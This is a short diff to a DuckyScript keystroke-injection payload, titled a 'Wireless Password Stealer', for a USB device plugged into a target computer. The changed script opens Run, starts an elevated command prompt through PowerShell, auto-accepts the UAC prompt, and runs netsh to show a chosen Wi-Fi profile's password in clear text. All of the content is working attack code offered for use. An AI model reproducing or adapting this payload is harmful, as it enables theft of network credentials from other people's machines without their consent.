@@ -1,15 +1,14 @@
 REM Only Wireless Password Stealer.
 REM Replace [BSSID] with the name of the Network you target computer is connecte to.
 REM Seconds: 6.95
-DELAY 1000
-GUI r
-DELAY 750
-STRING cmd.exe
-CTRL-SHIFT ENTER
+DELAY 2000
+WINDOWS r
 DELAY 200
-LEFTARROW
+STRING powershell Start-Process cmd.exe -Verb runAs
 ENTER
-DELAY 1000
+DELAY 2000
+ALT y
+DELAY 500
 STRING netsh wlan show profile name=[BSSID] key=clear
 ENTER
 DELAY 3000
